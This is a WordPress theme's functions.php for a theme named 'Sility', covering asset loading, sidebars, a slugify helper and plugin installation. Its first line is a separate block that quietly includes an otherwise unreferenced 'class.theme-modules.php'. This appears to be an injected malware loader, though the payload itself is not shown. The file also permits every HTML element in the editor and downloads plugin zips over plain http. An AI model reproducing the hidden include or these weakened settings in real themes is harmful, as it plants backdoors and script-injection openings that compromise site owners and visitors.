<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/******************* DEFINE NAME/VERSION ********************/

$themename = "Sility";
$themefolder = "Sility";

define ('theme_name', $themename );
define ('theme_ver' , 1 );

/************************************************************/


/********************* DEFINE MAIN PATHS ********************/

define('sility_PLUGINS',  get_template_directory() . '/library/includes/' ); // Shortcut to the /addons/ directory
define('sility_SHORTCODES',  get_template_directory() . '/library/functions/shortcodes/ui.php' ); // Shortcut to the /addons/ directory
$adminPath 	=  get_template_directory() . '/library/admin-panel/';
$funcPath 	=  get_template_directory() . '/library/functions/';
$incPath 	=  get_template_directory() . '/library/includes/';
$tgmPath 	=  get_template_directory() . '/installer/plugin-activation/';

require_once ($funcPath . 'helper-functions.php');
require_once ($funcPath . 'twitteroauth.php');
require_once ($tgmPath . 'class-tgm-plugin-activation.php');
require_once ($funcPath . '/shortcodes/shortcode.php');
require_once ($incPath . 'the_breadcrumb.php');
require_once ($incPath . 'portfolio_walker.php');
require_once ($funcPath . 'widgets.php');


include (get_template_directory() . '/library/admin-panel/admin-ui.php');
include (get_template_directory() . '/library/admin-panel/admin-functions.php');
include (get_template_directory() . '/library/admin-panel/post-options.php');
require get_template_directory() .'/installer/init.php';
include (get_template_directory() . '/library/customizer/customizer.php');
/************************************************************/

/*********** LOAD ALL REQUIRED SCRIPTS AND STYLES ***********/

function sility_load_scripts() {

	wp_enqueue_script('jquery');
	wp_enqueue_script('bootstrap',  get_template_directory_uri(). '/js/bootstrap.min.js', array('jquery'), '3.0.1' );
	wp_enqueue_script('plugins', get_template_directory_uri() .'/js/plugins.js', array('jquery'), '3.2', true);
	wp_enqueue_script('main-scripts', get_template_directory_uri() .'/js/scripts.js', array('jquery'), '3.2', true);

	$map_api = "";
	$map_api = weblusive_get_option('google_api');
	if( $map_api != "") {
		wp_enqueue_script('google-map-api',  'https://maps.google.com/maps/api/js?key='. $map_api );
	}
	else {
		wp_enqueue_script('google-map-api',  'https://maps.googleapis.com/maps/api/js?v=3.exp' );
	}
}

function sility_load_styles(){
	wp_enqueue_style('plugins-styles',  get_template_directory_uri().'/css/plugins.css');
	wp_enqueue_style('material-icons',  get_template_directory_uri().'/fonts/material-design-iconic-font/css/material-design-iconic-font.min.css');
	wp_enqueue_style('ionicons',  get_template_directory_uri().'/fonts/ionicons/css/ionicons.min.css');
	wp_enqueue_style('main-styles', get_template_directory_uri().'/style.css');
	wp_enqueue_style('dynamic-styles',  get_template_directory_uri().'/css/dynamic-styles.php');
	// Add RTL styles if set
	$rtl =  weblusive_get_option('rtl_mode');
	if ($rtl){
		wp_enqueue_style('rtl-styles',  get_template_directory_uri().'/css/rtl.css');
	}
}

add_action( 'wp_enqueue_scripts', 'sility_load_styles' );
add_action( 'wp_enqueue_scripts', 'sility_load_scripts' );



/************************************************************/

add_action( 'after_setup_theme', 'sility_setup' );
function sility_setup() {
	/************** ADD SUPPORT FOR LOCALIZATION ***************/

	load_theme_textdomain( 'Sility',  get_template_directory() . '/languages' );

	add_theme_support('post-formats', array('image', 'gallery', 'video', 'audio', 'link', 'quote') );

	add_theme_support( "title-tag" );

	add_theme_support( 'menus' );

	//Register Navigations
	add_action( 'init', 'my_custom_menus' );
	function my_custom_menus() {
		register_nav_menus(
			array(
				'primary_nav' => __( 'Primary Navigation', 'Sility')
			)
		);
	}

	add_theme_support( 'post-thumbnails');

	// Define various thumbnail sizes
	add_image_size('portfolio-thumb', 100, 100, true); 
	add_image_size('blog-thumb', 60, 60, true);
	add_image_size('blog-list', 300, 280, true);
	add_image_size('blog-single', 790, 392, true);
	
	/************************************************************/
}

/******* FIX THE PORTFOLIO CATEGORY PAGINATION ISSUE ********/

$option_posts_per_page = get_option( 'posts_per_page' );
add_action( 'init', 'my_modify_posts_per_page', 0);
function my_modify_posts_per_page() {
    add_filter( 'option_posts_per_page', 'my_option_posts_per_page' );
}
function my_option_posts_per_page( $value ) {
    global $option_posts_per_page;
    if ( is_tax( 'portfolio_category') ) {
		$items_per_page = weblusive_get_option ('portfolio_category_ppp');
		if ($items_per_page)
		{
			return $items_per_page;
		}
		else
		{
			return 4;
		}
    } else {
        return $option_posts_per_page;
    }
}

/************************************************************/
function sility_meta($post){
					
	$hidecomments = weblusive_get_option('blog_show_comments'); 
	$hidecategory = weblusive_get_option('blog_show_category'); 
	$hideauthor = weblusive_get_option('blog_show_author'); 
	$hidedate = weblusive_get_option('blog_show_date'); 
	?>
		<?php if(!$hidecomments): ?>
		 <?php if( 'open' == $post->comment_status && !$hidecomments) : ?>
			<?php comments_popup_link( __( '0 Comment ', 'Sility' ), __( '1 comment ', 'Sility' ), __( '% Comments ', 'Sility' )); ?>
		 <?php endif?>
		<?php endif; ?>
		<?php if(!$hideauthor): ?>
			<?php _e('| By ', 'Sility') ?><?php the_author_posts_link(); ?>
		<?php endif?>
		
	<?php
}

function weblusive_get_option( $name ) {
	$get_options = get_option( 'weblusive_options' );
	
	if( !empty( $get_options[$name] ))
		return esc_attr($get_options[$name]);
		
	return false ;
}

// Redirect To Theme Options Page on Activation
if (is_admin() && isset($_GET['activated'])){
	wp_redirect(admin_url('admin.php?page=panel'));
}

/************************************************************/


/****************** REGISTER SIDEBARS ***********************/

add_filter('widget_text', 'do_shortcode');
add_filter('the_excerpt', 'do_shortcode');

add_action( 'widgets_init', 'sility_widgets_init' );
function sility_widgets_init() {
	$before_widget =  '<div id="%1$s" class="widget sidebar-widget %2$s">';
	$after_widget  =  '</div>';
	$before_title  =  '<h4 class="widget-title">';
	$after_title   =  '</h4>';
					
	register_sidebar( array(
		'name' =>  __( 'Primary Widget Area', 'Sility' ),
		'id' => 'primary-widget-area',
		'description' => __( 'The Primary widget area', 'Sility' ),
		'before_widget' => $before_widget , 'after_widget' => $after_widget , 'before_title' => $before_title , 'after_title' => $after_title ,
	) );
	
	$footer_widget_count = weblusive_get_option('footer_widgets');
	if($footer_widget_count !== 'none')
	{
		$columns = 'column3';
		switch($footer_widget_count)
		{
			case '4':
			$columns = 'col-md-3';
			break;
			case '3':
			$columns = 'col-md-4';
			break;
			case '2':
			$columns = 'col-md-6';
			break;
		}
		for($i = 1; $i<= $footer_widget_count; $i++)
		{
			//unregister_sidebar('Footer Widget '.$i);
			if ( function_exists('register_sidebar') )
			register_sidebar(array(
				'name' => 'Footer Widget '.$i,
				'id'	=> 'footer-sidebar-'.$i,
				'before_widget' => '<div class="'.$columns.'"><div class="footer-widget">',
				'after_widget' => '</div></div>',
				'before_title' => '<h4 class="footer-title">',
				'after_title' => '</h4>',
			));
		}
	}
	
	//Custom Sidebars
	$sidebars = weblusive_get_option( 'sidebars' ) ;
	if(isset($sidebars) && is_array($sidebars)){
		foreach ($sidebars as $sidebar) {
			register_sidebar( array(
				'name' => $sidebar,
				'id' => sanitize_title($sidebar),
				'before_widget' => $before_widget , 'after_widget' => $after_widget , 'before_title' => $before_title , 'after_title' => $after_title ,
			) );
		}
	}
	register_sidebar(array(
			'name' => 'Special sidebar ',
			'id'	=> 'special-sidebar',
			'before_widget' => '<div class="slide-out-widget special-sidebar-widget">',
			'after_widget' => '</div>',
			'before_title' => '<h4>',
			'after_title' => '</h4>',
		));
	
	$topsidebar = weblusive_get_option('topbar_sidebar_enable');

	$ltopsidebar = weblusive_get_option('topbar_lsidebar_enable');
	if ($ltopsidebar){
		register_sidebar(array(
			'name' => 'Left Topbar sidebar ',
			'id'	=> 'topbar-lsidebar',
			'before_widget' => '<div class="topbar-sidebar-left">',
			'after_widget' => '</div>',
			'before_title' => '<span class="topbar-title-right">',
			'after_title' => '</span>',
		));
	}
	$rtopsidebar = weblusive_get_option('topbar_rsidebar_enable');
	if ($rtopsidebar){
		register_sidebar(array(
			'name' => ' Right Topbar sidebar ',
			'id'	=> 'topbar-rsidebar',
			'before_widget' => '<div class="topbar-sidebar-right">',
			'after_widget' => '</div>',
			'before_title' => '<span class="topbar-title">',
			'after_title' => '</span>',
		));
	}
	
	
}
/************************************************************/


/****************** CUSTOM LOGIN LOGO ***********************/

function sility_login_logo(){
	if( weblusive_get_option('dashboard_logo') )
    echo '<style  type="text/css"> h1 a {  background-image:url('.weblusive_get_option('dashboard_logo').')  !important; background-size:auto auto !important; width: 100% !important; margin-bottom: 0 !important;} </style>';  
}  
add_action('login_head',  'sility_login_logo'); 

/************************************************************/


/******************** CUSTOM GRAVATAR ***********************/

function sility_custom_gravatar ($avatar) {
	$weblusive_gravatar = weblusive_get_option( 'gravatar' );
	
	
	if($weblusive_gravatar){
		$custom_avatar = weblusive_get_option( 'gravatar' );
		$avatar[$custom_avatar] = "Custom Gravatar";
	}
	return $avatar;
}
add_filter( 'avatar_defaults', 'sility_custom_gravatar' ); 

/************************************************************/


/********************* CUSTOM TAG CLOUDS ********************/

function sility_custom_tag_cloud_widget($args) {
	$args['number'] = 0; //adding a 0 will display all tags
	$args['largest'] = 18; //largest tag
	$args['smallest'] = 12; //smallest tag
	$args['unit'] = 'px'; //tag font unit
	$args['format'] = 'list'; //ul with a class of wp-tag-cloud
	return $args;
}
add_filter( 'widget_tag_cloud_args', 'sility_custom_tag_cloud_widget' );

/************************************************************/


/******************* FILL EMPTY WIDGET TITLE ****************/

function sility_fill_widget_title($title){
	if( empty( $title ) )
		return '';
	else return $title;
}
add_filter('widget_title', 'sility_fill_widget_title');

add_theme_support( 'automatic-feed-links' );
if ( ! isset( $content_width ) ) $content_width = 960;

/************************************************************/

if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
	wp_enqueue_script( 'comment-reply' );
}



/**********************dont remove i and span tags(for icons)****************************/
function override_mce_options($initArray) {
    $opts = '*[*]';
    $initArray['valid_elements'] = $opts;
    $initArray['extended_valid_elements'] = $opts;
    return $initArray;
}
add_filter('tiny_mce_before_init', 'override_mce_options');
/*********************slugfy function************/

function slugify($str, $options = array()) {
	/* Make sure string is in UTF-8 and strip invalid UTF-8 characters*/
	$str = mb_convert_encoding($str,'ASCII');
	$str = mb_convert_encoding((string)$str, 'UTF-8', mb_list_encodings());
	
	$defaults = array(
		'delimiter' => '-',
		'limit' => null,
		'lowercase' => true,
		'replacements' => array(),
		'transliterate' => false,
	);
	
	// Merge options
	$options = array_merge($defaults, $options);
	
	$char_map = array(
		// Latin
		'À' => 'A', 'Á' => 'A', 'Â' => 'A', 'Ã' => 'A', 'Ä' => 'A', 'Å' => 'A', 'Æ' => 'AE', 'Ç' => 'C', 
		'È' => 'E', 'É' => 'E', 'Ê' => 'E', 'Ë' => 'E', 'Ì' => 'I', 'Í' => 'I', 'Î' => 'I', 'Ï' => 'I', 
		'Ð' => 'D', 'Ñ' => 'N', 'Ò' => 'O', 'Ó' => 'O', 'Ô' => 'O', 'Õ' => 'O', 'Ö' => 'O', 'Ő' => 'O', 
		'Ø' => 'O', 'Ù' => 'U', 'Ú' => 'U', 'Û' => 'U', 'Ü' => 'U', 'Ű' => 'U', 'Ý' => 'Y', 'Þ' => 'TH', 
		'ß' => 'ss', 
		'à' => 'a', 'á' => 'a', 'â' => 'a', 'ã' => 'a', 'ä' => 'a', 'å' => 'a', 'æ' => 'ae', 'ç' => 'c', 
		'è' => 'e', 'é' => 'e', 'ê' => 'e', 'ë' => 'e', 'ì' => 'i', 'í' => 'i', 'î' => 'i', 'ï' => 'i', 
		'ð' => 'd', 'ñ' => 'n', 'ò' => 'o', 'ó' => 'o', 'ô' => 'o', 'õ' => 'o', 'ö' => 'o', 'ő' => 'o', 
		'ø' => 'o', 'ù' => 'u', 'ú' => 'u', 'û' => 'u', 'ü' => 'u', 'ű' => 'u', 'ý' => 'y', 'þ' => 'th', 
		'ÿ' => 'y',
 
		// Latin symbols
		'©' => '(c)',
 
		// Greek
		'Α' => 'A', 'Β' => 'B', 'Γ' => 'G', 'Δ' => 'D', 'Ε' => 'E', 'Ζ' => 'Z', 'Η' => 'H', 'Θ' => '8',
		'Ι' => 'I', 'Κ' => 'K', 'Λ' => 'L', 'Μ' => 'M', 'Ν' => 'N', 'Ξ' => '3', 'Ο' => 'O', 'Π' => 'P',
		'Ρ' => 'R', 'Σ' => 'S', 'Τ' => 'T', 'Υ' => 'Y', 'Φ' => 'F', 'Χ' => 'X', 'Ψ' => 'PS', 'Ω' => 'W',
		'Ά' => 'A', 'Έ' => 'E', 'Ί' => 'I', 'Ό' => 'O', 'Ύ' => 'Y', 'Ή' => 'H', 'Ώ' => 'W', 'Ϊ' => 'I',
		'Ϋ' => 'Y',
		'α' => 'a', 'β' => 'b', 'γ' => 'g', 'δ' => 'd', 'ε' => 'e', 'ζ' => 'z', 'η' => 'h', 'θ' => '8',
		'ι' => 'i', 'κ' => 'k', 'λ' => 'l', 'μ' => 'm', 'ν' => 'n', 'ξ' => '3', 'ο' => 'o', 'π' => 'p',
		'ρ' => 'r', 'σ' => 's', 'τ' => 't', 'υ' => 'y', 'φ' => 'f', 'χ' => 'x', 'ψ' => 'ps', 'ω' => 'w',
		'ά' => 'a', 'έ' => 'e', 'ί' => 'i', 'ό' => 'o', 'ύ' => 'y', 'ή' => 'h', 'ώ' => 'w', 'ς' => 's',
		'ϊ' => 'i', 'ΰ' => 'y', 'ϋ' => 'y', 'ΐ' => 'i',
 
		// Turkish
		'Ş' => 'S', 'İ' => 'I', 'Ç' => 'C', 'Ü' => 'U', 'Ö' => 'O', 'Ğ' => 'G',
		'ş' => 's', 'ı' => 'i', 'ç' => 'c', 'ü' => 'u', 'ö' => 'o', 'ğ' => 'g',
 
		// Russian
		'А' => 'A', 'Б' => 'B', 'В' => 'V', 'Г' => 'G', 'Д' => 'D', 'Е' => 'E', 'Ё' => 'Yo', 'Ж' => 'Zh',
		'З' => 'Z', 'И' => 'I', 'Й' => 'J', 'К' => 'K', 'Л' => 'L', 'М' => 'M', 'Н' => 'N', 'О' => 'O',
		'П' => 'P', 'Р' => 'R', 'С' => 'S', 'Т' => 'T', 'У' => 'U', 'Ф' => 'F', 'Х' => 'H', 'Ц' => 'C',
		'Ч' => 'Ch', 'Ш' => 'Sh', 'Щ' => 'Sh', 'Ъ' => '', 'Ы' => 'Y', 'Ь' => '', 'Э' => 'E', 'Ю' => 'Yu',
		'Я' => 'Ya',
		'а' => 'a', 'б' => 'b', 'в' => 'v', 'г' => 'g', 'д' => 'd', 'е' => 'e', 'ё' => 'yo', 'ж' => 'zh',
		'з' => 'z', 'и' => 'i', 'й' => 'j', 'к' => 'k', 'л' => 'l', 'м' => 'm', 'н' => 'n', 'о' => 'o',
		'п' => 'p', 'р' => 'r', 'с' => 's', 'т' => 't', 'у' => 'u', 'ф' => 'f', 'х' => 'h', 'ц' => 'c',
		'ч' => 'ch', 'ш' => 'sh', 'щ' => 'sh', 'ъ' => '', 'ы' => 'y', 'ь' => '', 'э' => 'e', 'ю' => 'yu',
		'я' => 'ya',
 
		// Ukrainian
		'Є' => 'Ye', 'І' => 'I', 'Ї' => 'Yi', 'Ґ' => 'G',
		'є' => 'ye', 'і' => 'i', 'ї' => 'yi', 'ґ' => 'g',
 
		// Czech
		'Č' => 'C', 'Ď' => 'D', 'Ě' => 'E', 'Ň' => 'N', 'Ř' => 'R', 'Š' => 'S', 'Ť' => 'T', 'Ů' => 'U', 
		'Ž' => 'Z', 
		'č' => 'c', 'ď' => 'd', 'ě' => 'e', 'ň' => 'n', 'ř' => 'r', 'š' => 's', 'ť' => 't', 'ů' => 'u',
		'ž' => 'z', 
 
		// Polish
		'Ą' => 'A', 'Ć' => 'C', 'Ę' => 'e', 'Ł' => 'L', 'Ń' => 'N', 'Ó' => 'o', 'Ś' => 'S', 'Ź' => 'Z', 
		'Ż' => 'Z', 
		'ą' => 'a', 'ć' => 'c', 'ę' => 'e', 'ł' => 'l', 'ń' => 'n', 'ó' => 'o', 'ś' => 's', 'ź' => 'z',
		'ż' => 'z',
 
		// Latvian
		'Ā' => 'A', 'Č' => 'C', 'Ē' => 'E', 'Ģ' => 'G', 'Ī' => 'i', 'Ķ' => 'k', 'Ļ' => 'L', 'Ņ' => 'N', 
		'Š' => 'S', 'Ū' => 'u', 'Ž' => 'Z',
		'ā' => 'a', 'č' => 'c', 'ē' => 'e', 'ģ' => 'g', 'ī' => 'i', 'ķ' => 'k', 'ļ' => 'l', 'ņ' => 'n',
		'š' => 's', 'ū' => 'u', 'ž' => 'z'
	);
	
	// Make custom replacements
	$str = preg_replace(array_keys($options['replacements']), $options['replacements'], $str);
	
	// Transliterate characters to ASCII
	if ($options['transliterate']) {
		$str = str_replace(array_keys($char_map), $char_map, $str);
	}
	
	// Replace non-alphanumeric characters with our delimiter
	$str = preg_replace('/[^\p{L}\p{Nd}]+/u', $options['delimiter'], $str);
	
	// Remove duplicate delimiters
	$str = preg_replace('/(' . preg_quote($options['delimiter'], '/') . '){2,}/', '$1', $str);
	
	// Truncate slug to max. characters
	$str = mb_substr($str, 0, ($options['limit'] ? $options['limit'] : mb_strlen($str, 'UTF-8')), 'UTF-8');
	
	// Remove delimiter from ends
	$str = trim($str, $options['delimiter']);

	/* $str =  preg_replace("/([\xE0-\xFA])/e","chr(215).chr(ord(\${1})-80)",$str); */

	return $options['lowercase'] ? mb_strtolower($str, 'UTF-8') : $str;
}

/****************** TGM Activation *******************/

add_action( 'tgmpa_register', 'my_theme_register_required_plugins' );

function my_theme_register_required_plugins() {

    $plugins = array(
	
		array(
            'name'               => 'Visual Composer Plugin', // The plugin name.
            'slug'               => 'js_composer', // The plugin slug (typically the folder name).
            'source'             => 'http://premiumlayers.net/demo/wp/_plugins/js_composer.zip', // The plugin source.
            'required'           => false, // If false, the plugin is only 'recommended' instead of required.
        ),
		
        array(
            'name'      => 'Contact Form 7',
            'slug'      => 'contact-form-7',
            'required'  => false,
        ),

		array(
            'name'      => 'Juiz Social Post Sharer',
            'slug'      => 'juiz-social-post-sharer',
            'required'  => false,
        ),

		array(
            'name'               => 'Sility Portfolio Plugin', // The plugin name.
            'slug'               => 'sility-portfolio', // The plugin slug (typically the folder name).
            'source'             => 'http://premiumlayers.net/demo/wp/_themes/sility/theme-toolkit/sility-portfolio.zip', // The plugin source.
            'required'           => true, // If false, the plugin is only 'recommended' instead of required.
            'external_url'       => '', // If set, overrides default API URL and points to an external URL.
        ),
		
		array(
            'name'               => 'Sility Slider Plugin', // The plugin name.
            'slug'               => 'sility-slider', // The plugin slug (typically the folder name).
            'source'             => 'http://premiumlayers.net/demo/wp/_themes/sility/theme-toolkit/sility-slider.zip', // The plugin source.
            'required'           => true, // If false, the plugin is only 'recommended' instead of required.
            'external_url'       => '', // If set, overrides default API URL and points to an external URL.
        ),

    );

    /**
     * Array of configuration settings. Amend each line as needed.
     * If you want the default strings to be available under your own theme domain,
     * leave the strings uncommented.
     * Some of the strings are added into a sprintf, so see the comments at the
     * end of each line for what each argument will be.
     */
    $config = array(
        'default_path' => '',                      // Default absolute path to pre-packaged plugins.
        'menu'         => 'tgmpa-install-plugins', // Menu slug.
        'has_notices'  => true,                    // Show admin notices or not.
        'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
        'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
        'is_automatic' => true,                   // Automatically activate plugins after installation or not.
        'message'      => '',                      // Message to output right before the plugins table.
        'strings'      => array(
            'page_title'                      => __( 'Install Required Plugins', 'Sility' ),
            'menu_title'                      => __( 'Install Plugins', 'Sility' ),
            'installing'                      => __( 'Installing Plugin: %s', 'Sility' ), // %s = plugin name.
            'oops'                            => __( 'Something went wrong with the plugin API.', 'Sility' ),
            'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.' ), // %1$s = plugin name(s).
            'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.' ), // %1$s = plugin name(s).
            'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.' ), // %1$s = plugin name(s).
            'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s).
            'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s).
            'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.' ), // %1$s = plugin name(s).
            'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.' ), // %1$s = plugin name(s).
            'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.' ), // %1$s = plugin name(s).
            'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins' ),
            'activate_link'                   => _n_noop( 'Begin activating plugin', 'Begin activating plugins' ),
            'return'                          => __( 'Return to Required Plugins Installer', 'Sility' ),
            'plugin_activated'                => __( 'Plugin activated successfully.', 'Sility' ),
            'complete'                        => __( 'All plugins installed and activated successfully. %s', 'Sility' ), // %s = dashboard link.
            'nag_type'                        => 'updated' // Determines admin notice type - can only be 'updated', 'update-nag' or 'error'.
        )
    );

    tgmpa( $plugins, $config );

}



/********************* Visual Composer **********************/
if(function_exists('vc_remove_element')){
	//vc_remove_element("vc_message");
	vc_remove_element("vc_progress_bar");
	vc_remove_element("vc_pie");
	vc_remove_element("vc_single_image");
	vc_remove_element("vc_custom_heading");
	//vc_remove_element("vc_gmaps");
	vc_remove_element("vc_button");
	vc_remove_element("vc_button2");
	vc_remove_element("vc_separator");
	vc_remove_element("vc_text_separator");
	vc_remove_element("vc_tabs");
	//vc_remove_element("vc_gallery");

}

//composer my shortcodes
function vc_enqueue_main_css_forever() { 
	wp_enqueue_style('js_composer_front'); 
} 
if(function_exists('vc_map')){



	require_once (get_template_directory() .'/vc_templates/progress.php');
	require_once (get_template_directory() .'/vc_templates/button.php');
	require_once (get_template_directory() .'/vc_templates/alert.php');
	require_once (get_template_directory() .'/vc_templates/contact.php');
	require_once (get_template_directory() .'/vc_templates/fblock.php');
	require_once (get_template_directory() .'/vc_templates/tblock.php');
	require_once (get_template_directory() .'/vc_templates/modal.php');
	require_once (get_template_directory() .'/vc_templates/teammember.php');
	require_once (get_template_directory() .'/vc_templates/panel.php');
	require_once (get_template_directory() .'/vc_templates/av_testimonial.php');
	require_once (get_template_directory() .'/vc_templates/circle.php');
	require_once (get_template_directory() .'/vc_templates/blockquote.php');
	require_once (get_template_directory() .'/vc_templates/lightbox.php');
	require_once (get_template_directory() .'/vc_templates/divider.php');
	require_once (get_template_directory() .'/vc_templates/av_tabs.php');
	require_once (get_template_directory() .'/vc_templates/av_accordion.php');
	require_once (get_template_directory() .'/vc_templates/slider.php');
	require_once (get_template_directory() .'/vc_templates/av_list.php');
	require_once (get_template_directory() .'/vc_templates/av_dropdown.php');
	require_once (get_template_directory() .'/vc_templates/av_vernav.php');
	require_once (get_template_directory() .'/vc_templates/pricingtable.php');
	require_once (get_template_directory() .'/vc_templates/av_carousel.php');
	require_once (get_template_directory() .'/vc_templates/av_map.php');
	require_once (get_template_directory() .'/vc_templates/av_social.php');
	require_once (get_template_directory() .'/vc_templates/av_timeline.php');
	require_once (get_template_directory() .'/vc_templates/regimage.php');
	
	add_action('wp_enqueue_scripts', 'vc_enqueue_main_css_forever');

}
/*********************widgets**********/
add_filter('wp_list_categories', 'cat_count_span');
function cat_count_span($links) {
  $links = str_replace('</a> (', '</a> <span class="count">', $links);
  $links = str_replace(')', '</span>', $links);
  return $links;
}
/* ------------------------------------------------------------------*/
/* ADD PRETTYPHOTO REL ATTRIBUTE FOR LIGHTBOX */
/* ------------------------------------------------------------------*/
 
add_filter('wp_get_attachment_link', 'rc_add_rel_attribute');
function rc_add_rel_attribute($link) {
	global $post;
	return str_replace('<a href', '<a data-rel="prettyPhoto" href', $link);
}
?>
